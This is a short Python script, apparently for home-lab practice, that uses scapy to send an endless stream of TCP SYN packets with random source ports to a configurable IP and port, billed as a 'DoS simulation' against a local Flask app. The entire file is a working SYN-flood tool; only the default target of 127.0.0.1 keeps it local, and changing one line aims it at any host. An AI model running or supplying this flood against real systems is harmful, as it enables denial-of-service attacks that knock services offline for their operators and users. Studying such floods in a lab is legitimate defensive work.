from scapy.all import IP, TCP, send
import random
import time

target_ip = "127.0.0.1"  # localhost or use 192.168.x.x for your actual IP
target_port = 80       # the port you're running Flask or another app on

print(f"Starting DoS simulation on {target_ip}:{target_port}")

try:
    while True:
        # Random source port
        sport = random.randint(1024, 65535)

        # Craft packet
        pkt = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")

        # Send packet
        send(pkt, verbose=False)
        print(f" Packet sent from {sport} ➜ {target_port}")
        time.sleep(0.01)  # Lower = more aggressive (careful!)
except KeyboardInterrupt:
    print(" Simulation stopped by user.")
